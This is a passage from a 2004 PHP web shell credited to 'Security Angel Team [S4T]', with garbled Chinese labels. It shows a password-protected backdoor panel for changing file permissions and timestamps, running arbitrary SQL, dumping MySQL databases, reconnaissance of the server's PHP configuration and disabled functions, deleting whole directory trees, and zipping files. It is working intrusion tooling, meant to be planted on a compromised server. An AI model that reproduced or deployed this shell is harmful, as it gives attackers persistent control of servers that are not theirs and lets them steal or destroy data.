   <tr class="secondalt"><td align="center">ËµÃ÷:ÔÂ·ÝºóÃæµÄºÅÈ¡01µ½30Ö®¼ä£¬Ð¡Ê±£¨¼¸µã£©È¡0µ½24£¬·ÖºÍÃëÈ¡0µ½60Ö®¼ä£¡</td></tr></table></form>
   <?php
   }//end edittime
   elseif ($_GET['action'] == "fileperm") {
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">ÐÞ¸ÄÎÄ¼þÊôÐÔ [<a href="?dir=<?=urlencode($dir)?>">·µ»Ø</a>]</td></tr><form action="?dir=<?=urlencode($dir)?>" method="POST"><tr class="secondalt"><td align="center"><input name="file" type="text" value="<?=$file?>" class="input" readonly> µÄÊôÐÔÎª:<input type="text" name="fileperm" size="20" value="<?=substr(base_convert(fileperms($dir."/".$file),10,8),-4)?>" class="input"><input name="dir" type="hidden" value="<?=urlencode($dir)?>"><input type="submit" name="editfileperm" value="modify" class="input"></td></tr></form></table>
   <?php
   }//end fileperm
   elseif ($_GET['action'] == "sql") {
       $servername = isset($servername) ? $servername : 'localhost';
       $dbusername = isset($dbusername) ? $dbusername : 'root';
       $dbpassword = isset($dbpassword) ? $dbpassword : '';
       $dbname = isset($dbname) ? $dbname : '';
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">Ö´ÐÐ SQL Óï¾ä</td></tr><form action="?action=sql" method="POST"><tr class="secondalt"><td align="center">Host:<input name="servername" type="text" class="INPUT" value="<?=$servername?>"> User:<input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">Pass:<input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">DB:<input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>"><input name="connect" type="submit" class="INPUT" value="Á¬½Ó"></td></tr><tr class="firstalt"><td align="center"><textarea name="sql_query" cols="85" rows="10"></textarea></td></tr><tr class="secondalt"><td align="center"><input type="submit" name="doquery" value="Ö´ÐÐ" class="input"></td></tr></form></table>
   <?php
   }//end sql query
   elseif ($_GET['action'] == "sqlbak") {
       $servername = isset($servername) ? $servername : 'localhost';
       $dbusername = isset($dbusername) ? $dbusername : 'root';
       $dbpassword = isset($dbpassword) ? $dbpassword : '';
       $dbname = isset($dbname) ? $dbname : '';
   ?>
   <table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><tr class="firstalt"><td align="center">±¸·Ý MySQL Êý¾Ý¿â</td></tr><form action="?action=sqlbak" method="POST"><tr class="secondalt"><td align="center">Host:<input name="servername" type="text" class="INPUT" value="<?=$servername?>">User:<input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">Pass:<input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">DB:<input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>"><input name="connect" type="submit" class="INPUT" value="Á¬½Ó"></td></tr>
   <?php
       @mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
       $tables = @mysql_list_tables($dbname);
       while ($table = @mysql_fetch_row($tables)) {
           $cachetables[$table[0]] = $table[0];
       }
       @mysql_free_result($tables);

       if (empty($cachetables)) {
           echo "<tr>\n";
           echo "  <td align=\"center\" class=\"firstalt\"><b>ÄúÃ»ÓÐÁ¬½ÓÊý¾Ý¿â or µ±Ç°Êý¾Ý¿âÃ»ÓÐÈÎºÎÊý¾Ý±í</b></td>\n";
           echo "</tr>\n";
       } else {
       ?>
       <tr><td align="center" class="secondalt"><table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">ÇëÑ¡Ôñ±í:</td><td><select name="table[]" multiple size="15">
       <?php
       if (is_array($cachetables)) {
           foreach ($cachetables AS $key=>$value) {
               echo "<option value=\"$key\">$value</option>\n";
           }
       }
       ?>
       </select></td></tr><tr nowrap><td>±¸·ÝÊý¾ÝËù±£´æµÄÂ·¾¶:</td><td><input type="text" class="INPUT" name="path" size="50" maxlength="50" value="./<?=$_SERVER['HTTP_HOST']?>_MySQL.sql"></td></tr></table></td></tr><tr><td align="center" class="firstalt"><input type="submit" name="dobackup" value="¿ªÊ¼±¸·Ý" class="INPUT"></td></tr>
       <?php
       }
       echo "  </form>\n";
       echo "</table>\n";
       @mysql_close();
   }//end sql backup
   elseif ($_GET['action'] == "phpenv") {
       $upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "²»ÔÊÐíÉÏ´«";
   $adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";

       $dis_func = get_cfg_var("disable_functions");
       if ($dis_func == "") {
           $dis_func = "No";
       }else {
           $dis_func = str_replace(" ","<br>",$dis_func);
           $dis_func = str_replace(",","<br>",$dis_func);
       }
       $phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
   $info[0]  = array("·þÎñÆ÷Ê±¼ä",date("YÄêmÔÂdÈÕ h:i:s",time()));
       $info[1]  = array("·þÎñÆ÷ÓòÃû","<a href=\"http://$_SERVER[SERVER_NAME]\" target=\"_blank\">$_SERVER[SERVER_NAME]</a>");
       $info[2]  = array("·þÎñÆ÷IPµØÖ·",gethostbyname($_SERVER['SERVER_NAME']));
       $info[3]  = array("·þÎñÆ÷²Ù×÷ÏµÍ³",PHP_OS);
       $info[5]  = array("·þÎñÆ÷²Ù×÷ÏµÍ³ÎÄ×Ö±àÂë",$_SERVER['HTTP_ACCEPT_LANGUAGE']);
       $info[6]  = array("·þÎñÆ÷½âÒëÒýÇæ",$_SERVER['SERVER_SOFTWARE']);
       $info[7]  = array("Web·þÎñ¶Ë¿Ú",$_SERVER['SERVER_PORT']);
       $info[8]  = array("PHPÔËÐÐ·½Ê½",strtoupper(php_sapi_name()));
       $info[9]  = array("PHP°æ±¾",PHP_VERSION);
       $info[10] = array("ÔËÐÐÓÚ°²È«Ä£Ê½",getphpcfg("safemode"));
       $info[11] = array("·þÎñÆ÷¹ÜÀíÔ±",$adminmail);
       $info[12] = array("±¾ÎÄ¼þÂ·¾¶",__FILE__);
       $info[13] = array("ÔÊÐíÊ¹ÓÃ URL ´ò¿ªÎÄ¼þ allow_url_fopen",getphpcfg("allow_url_fopen"));
       $info[14] = array("ÔÊÐí¶¯Ì¬¼ÓÔØÁ´½Ó¿â enable_dl",getphpcfg("enable_dl"));
       $info[15] = array("ÏÔÊ¾´íÎóÐÅÏ¢ display_errors",getphpcfg("display_errors"));
       $info[16] = array("×Ô¶¯¶¨ÒåÈ«¾Ö±äÁ¿ register_globals",getphpcfg("register_globals"));
       $info[17] = array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc"));
       $info[18] = array("³ÌÐò×î¶àÔÊÐíÊ¹ÓÃÄÚ´æÁ¿ memory_limit",getphpcfg("memory_limit"));
       $info[19] = array("POST×î´ó×Ö½ÚÊý post_max_size",getphpcfg("post_max_size"));
       $info[20] = array("ÔÊÐí×î´óÉÏ´«ÎÄ¼þ upload_max_filesize",$upsize);
       $info[21] = array("³ÌÐò×î³¤ÔËÐÐÊ±¼ä max_execution_time",getphpcfg("max_execution_time")."Ãë");
       $info[22] = array("±»½ûÓÃµÄº¯Êý disable_functions",$dis_func);
       $info[23] = array("phpinfo()",$phpinfo);
       $info[24] = array("Ä¿Ç°»¹ÓÐ¿ÕÓà¿Õ¼ädiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb');
   $info[25] = array("Í¼ÐÎ´¦Àí GD Library",getfun("imageline"));
       $info[26] = array("IMAPµç×ÓÓÊ¼þÏµÍ³",getfun("imap_close"));
       $info[27] = array("MySQLÊý¾Ý¿â",getfun("mysql_close"));
       $info[28] = array("SyBaseÊý¾Ý¿â",getfun("sybase_close"));
       $info[29] = array("OracleÊý¾Ý¿â",getfun("ora_close"));
       $info[30] = array("Oracle 8 Êý¾Ý¿â",getfun("OCILogOff"));
       $info[31] = array("PRELÏàÈÝÓï·¨ PCRE",getfun("preg_match"));
       $info[32] = array("PDFÎÄµµÖ§³Ö",getfun("pdf_close"));
       $info[33] = array("Postgre SQLÊý¾Ý¿â",getfun("pg_close"));
       $info[34] = array("SNMPÍøÂç¹ÜÀíÐÒé",getfun("snmpget"));
       $info[35] = array("Ñ¹ËõÎÄ¼þÖ§³Ö(Zlib)",getfun("gzclose"));
       $info[36] = array("XML½âÎö",getfun("xml_set_object"));
       $info[37] = array("FTP",getfun("ftp_login"));
       $info[38] = array("ODBCÊý¾Ý¿âÁ¬½Ó",getfun("odbc_close"));
       $info[39] = array("SessionÖ§³Ö",getfun("session_start"));
       $info[40] = array("SocketÖ§³Ö",getfun("fsockopen"));
   ?>
   <table width="760" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff"><form action="?action=phpenv" method="POST"><tr class="firstalt"><td style="padding-left: 5px;"><b>²é¿´PHPÅäÖÃ²ÎÊý×´¿ö</b></td></tr><tr class="secondalt"><td style="padding-left: 5px;">ÇëÊäÈëÅäÖÃ²ÎÊý(Èç:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40"> <input type="submit" name="viewphpvar" value="²é¿´" class="input"></td>
     </tr>
    </form>
   <?php
       for($a=0;$a<3;$a++){
           if($a == 0){
               $hp = array("server","·þÎñÆ÷ÌØÐÔ");
           }elseif($a == 1){
               $hp = array("php","PHP»ù±¾ÌØÐÔ");
           }elseif($a == 2){
               $hp = array("basic","×é¼þÖ§³Ö×´¿ö");
           }
   ?>
     <tr class="firstalt">
       <td style="padding-left: 5px;"><b><?=$hp[1]?></b></td>
     </tr>
     <tr class="secondalt">
       <td>
         <table width="100%" border="0" cellpadding="0" cellspacing="0">
   <?php
           if($a == 0){
               for($i=0;$i<=12;$i++){
                   echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
               }
           }elseif($a == 1){
               for($i=13;$i<=24;$i++){
                   echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
               }
           }elseif($a == 2){
               for($i=25;$i<=40;$i++){
                   echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
               }
           }
   ?>
   </table></td></tr>
   <?php
       }//for
   echo "</table>";
   }//end phpenv
   ?>
   <hr width="760" noshade><table width="760" border="0" cellpadding="0"><tr><td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td><td align="right"><?php debuginfo(); ob_end_flush();    ?></td></tr></table></center></body></html><?php
   /*======================================================
   º¯Êý¿â
   ======================================================*/
   // µÇÂ½Èë¿Ú
       function loginpage() {
   ?>
           <style type="text/css">
           input {
               font-family: "Verdana";
               font-size: "11px";
               BACKGROUND-COLOR: "#FFFFFF";
               height: "18px";
               border: "1px solid #666666";
           }
           </style><form method="POST" action=""><span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20"><input type="submit" name="login" value="OK"></form>
   <?php
           exit;
       }//end loginpage()
       // Ò³Ãæµ÷ÊÔÐÅÏ¢
       function debuginfo() {
           global $starttime;
           $mtime = explode(' ', microtime());
           $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
           echo "Processed in $totaltime second(s)";
       }
   // È¥µô×ªÒå×Ö·û
       function stripslashes_array(&$array) {
           while(list($key,$var) = each($array)) {
               if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
                   if (is_string($var)) {
                       $array[$key] = stripslashes($var);
                   }
                   if (is_array($var))  {
                       $array[$key] = stripslashes_array($var);
                   }
               }
           }
           return $array;
       }
   // É¾³ýÄ¿Â¼
       function deltree($deldir) {
           $mydir=@dir($deldir);
           while($file=$mydir->read()) {
               if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) {
                   @chmod("$deldir/$file",0777);
                   deltree("$deldir/$file");
               }
               if (is_file("$deldir/$file")) {
                   @chmod("$deldir/$file",0777);
                   @unlink("$deldir/$file");
               }
           }
           $mydir->close();
           @chmod("$deldir",0777);
           echo @rmdir($deldir) ? "Ä¿Â¼É¾³ý³É¹¦!" : "<font color=\"#ff0000\">Ä¿Â¼É¾³ýÊ§°Ü!</font>";
       }
   // ÅÐ¶Ï¶ÁÐ´Çé¿ö
       function dir_writeable($dir) {
           if (!is_dir($dir)) {
               @mkdir($dir, 0777);
           }
           if(is_dir($dir)) {
               if ($fp = @fopen("$dir/test.txt", 'w')) {
                   @fclose($fp);
                   @unlink("$dir/test.txt");
                   $writeable = 1;
               } else {
                   $writeable = 0;
               }
           }
           return $writeable;
       }
   // ±í¸ñÐÐ¼äµÄ±³¾°É«Ìæ»»
       function getrowbg() {
           global $bgcounter;
           if ($bgcounter++%2==0) {
               return "firstalt";
           } else {
               return "secondalt";
           }
       }
   // »ñÈ¡µ±Ç°µÄÎÄ¼þÏµÍ³Â·¾¶
       function getPath($mainpath, $relativepath) {
           global $dir;
           $mainpath_info           = explode('/', $mainpath);
           $relativepath_info       = explode('/', $relativepath);
           $relativepath_info_count = count($relativepath_info);
           for ($i=0; $i<$relativepath_info_count; $i++) {
               if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
               if ($relativepath_info[$i] == '..') {
                   $mainpath_info_count = count($mainpath_info);
                   unset($mainpath_info[$mainpath_info_count-1]);
                   continue;
               }
               $mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
           } //end for
           return implode('/', $mainpath_info);
       }
   // ¼ì²éPHPÅäÖÃ²ÎÊý
       function getphpcfg($varname) {
           switch($result = get_cfg_var($varname)) {
               case 0:
               return No;
               break;
               case 1:
               return Yes;
               break;
               default:
               return $result;
               break;
           }
       }
   // ¼ì²éº¯ÊýÇé¿ö
       function getfun($funName) {
           return (false !== function_exists($funName)) ? Yes : No;
       }
   // Ñ¹Ëõ´ò°üÀà
       class PHPZip{
       var $out='';
           function PHPZip($dir, $zipfilename="")  {
               if (@function_exists('gzcompress')) {
                   $curdir = getcwd();
                   if (is_array($dir)) $filelist = $dir;
                   else{
                       $filelist=$this -> GetFileList($dir);//ÎÄ¼þÁÐ±í
                       foreach($filelist as $k=>$v) $filelist[]=substr($v,strlen($dir)+1);
                   }
                   if ((!empty($dir))&&(!is_array($dir))&&(file_exists($dir))) chdir($dir);
                   else chdir($curdir);
                   if (count($filelist)>0){
                       foreach($filelist as $filename){
                           if (is_file($filename)){
                               $fd = fopen ($filename, "r");
                               $content = @fread ($fd, filesize ($filename));
                               fclose ($fd);
                               if (is_array($dir)) $filename = basename($filename);
                               $this -> addFile($content, $filename);
                           }
                       }
                       $this->out = $this -> file();
                       chdir($curdir);
                       // ÏÂÃæ½«Éú³ÉµÄÄÚÈÝ$outÐ´ÈëÎÄ¼þ,Èç¹ûÐèÒªÔÚ·þÎñÆ÷Éú³ÉÑ¹Ëõ°ü£¬ÇëÈ¥µô×¢ÊÍ
                       /*$fp = fopen($zipfilename, "w");
                       fwrite($fp, $this->out, strlen($this->out));
                       fclose($fp);
                       */
                   }
                   return 1;
               }
               else return 0;
           }
   // »ñµÃÖ¸¶¨Ä¿Â¼ÎÄ¼þÁÐ±í
           function GetFileList($dir){
               static $a;
               if (is_dir($dir)) {
                   if ($dh = opendir($dir)) {
                       while (($file = readdir($dh)) !== false) {
                           if($file!='.' && $file!='..'){
                               $f=$dir .'/'. $file;
                               if(is_dir($f)) $this->GetFileList($f);
                               $a[]=$f;
                           }
                       }
                       closedir($dh);
                   }
               }
               return $a;
           }

           var $datasec      = array();
           var $ctrl_dir     = array();
           var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
           var $old_offset   = 0;

           function unix2DosTime($unixtime = 0) {
               $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
               if ($timearray['year'] < 1980) {
                   $timearray['year']    = 1980;
                   $timearray['mon']     = 1;
                   $timearray['mday']    = 1;
                   $timearray['hours']   = 0;
                   $timearray['minutes'] = 0;
                   $timearray['seconds'] = 0;
               } // end if
               return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                       ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
           }

           function addFile($data, $name, $time = 0) {
               $name     = str_replace('\\', '/', $name);

               $dtime    = dechex($this->unix2DosTime($time));
               $hexdtime = '\x' . $dtime[6] . $dtime[7]
                         . '\x' . $dtime[4] . $dtime[5]
                         . '\x' . $dtime[2] . $dtime[3]
                         . '\x' . $dtime[0] . $dtime[1];
               eval('$hexdtime = "' . $hexdtime . '";');
               $fr   = "\x50\x4b\x03\x04";
               $fr   .= "\x14\x00";
               $fr   .= "\x00\x00";
               $fr   .= "\x08\x00";
               $fr   .= $hexdtime;

               $unc_len = strlen($data);
               $crc     = crc32($data);
               $zdata   = gzcompress($data);
               $c_len   = strlen($zdata);
               $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
               $fr      .= pack('V', $crc);
               $fr      .= pack('V', $c_len);
               $fr      .= pack('V', $unc_len);
               $fr      .= pack('v', strlen($name));
               $fr      .= pack('v', 0);
               $fr      .= $name;

               $fr .= $zdata;

               $fr .= pack('V', $crc);
               $fr .= pack('V', $c_len);
               $fr .= pack('V', $unc_len);

               $this -> datasec[] = $fr;
               $new_offset        = strlen(implode('', $this->datasec));

               $cdrec = "\x50\x4b\x01\x02";
               $cdrec .= "\x00\x00";
               $cdrec .= "\x14\x00";
               $cdrec .= "\x00\x00";
               $cdrec .= "\x08\x00";
               $cdrec .= $hexdtime;
               $cdrec .= pack('V', $crc);
               $cdrec .= pack('V', $c_len);
               $cdrec .= pack('V', $unc_len);
               $cdrec .= pack('v', strlen($name) );
               $cdrec .= pack('v', 0 );
               $cdrec .= pack('v', 0 );
               $cdrec .= pack('v', 0 );
               $cdrec .= pack('v', 0 );
               $cdrec .= pack('V', 32 );
               $cdrec .= pack('V', $this -> old_offset );
               $this -> old_offset = $new_offset;
               $cdrec .= $name;

               $this -> ctrl_dir[] = $cdrec;
           }

           function file() {
               $data    = implode('', $this -> datasec);
               $ctrldir = implode('', $this -> ctrl_dir);
               return
                   $data .
                   $ctrldir .
                   $this -> eof_ctrl_dir .
                   pack('v', sizeof($this -> ctrl_dir)) .
                   pack('v', sizeof($this -> ctrl_dir)) .
                   pack('V', strlen($ctrldir)) .
                   pack('V', strlen($data)) .
                   "\x00\x00";
           }
       }
   // ±¸·ÝÊý¾Ý¿â
       function sqldumptable($table, $fp=0) {
           $tabledump = "DROP TABLE IF EXISTS $table;\n";
           $tabledump .= "CREATE TABLE $table (\n";

           $firstfield=1;

           $fields = mysql_query("SHOW FIELDS FROM $table");
           while ($field = mysql_fetch_array($fields)) {
               if (!$firstfield) {
                   $tabledump .= ",\n";
               } else {
                   $firstfield=0;
               }
               $tabledump .= "   $field[Field] $field[Type]";
               if (!empty($field["Default"])) {
                   $tabledump .= " DEFAULT '$field[Default]'";
               }
               if ($field['Null'] != "YES") {
                   $tabledump .= " NOT NULL";
               }
               if ($field['Extra'] != "") {
                   $tabledump .= " $field[Extra]";
               }
           }
           mysql_free_result($fields);

           $keys = mysql_query("SHOW KEYS FROM $table");
           while ($key = mysql_fetch_array($keys)) {
               $kname=$key['Key_name'];
               if ($kname != "PRIMARY" and $key['Non_unique'] == 0) {
                   $kname="UNIQUE|$kname";
               }
               if(!is_array($index[$kname])) {
                   $index[$kname] = array();
               }
               $index[$kname][] = $key['Column_name'];
           }
           mysql_free_result($keys);

           while(list($kname, $columns) = @each($index)) {
               $tabledump .= ",\n";
               $colnames=implode($columns,",");

               if ($kname == "PRIMARY") {
                   $tabledump .= "   PRIMARY KEY ($colnames)";
               } else {
                   if (substr($kname,0,6) == "UNIQUE") {
                       $kname=substr($kname,7);
                   }
                   $tabledump .= "   KEY $kname ($colnames)";
               }
           }

           $tabledump .= "\n);\n\n";
           if ($fp) {
               fwrite($fp,$tabledump);
           } else {
               echo $tabledump;
           }

           $rows = mysql_query("SELECT * FROM $table");
           $numfields = mysql_num_fields($rows);
           while ($row = mysql_fetch_array($rows)) {
               $tabledump = "INSERT INTO $table VALUES(";

               $fieldcounter=-1;
               $firstfield=1;
               while (++$fieldcounter<$numfields) {
                   if (!$firstfield) {
                       $tabledump.=", ";
                   } else {
                       $firstfield=0;
                   }

                   if (!isset($row[$fieldcounter])) {
                       $tabledump .= "NULL";
                   } else {
                       $tabledump .= "'".mysql_escape_string($row[$fieldcounter])."'";
                   }
               }
   $tabledump .= ");\n";

               if ($fp) {
                   fwrite($fp,$tabledump);
               } else {
                   echo $tabledump;
               }
           }
           mysql_free_result($rows);
       }

   ?>
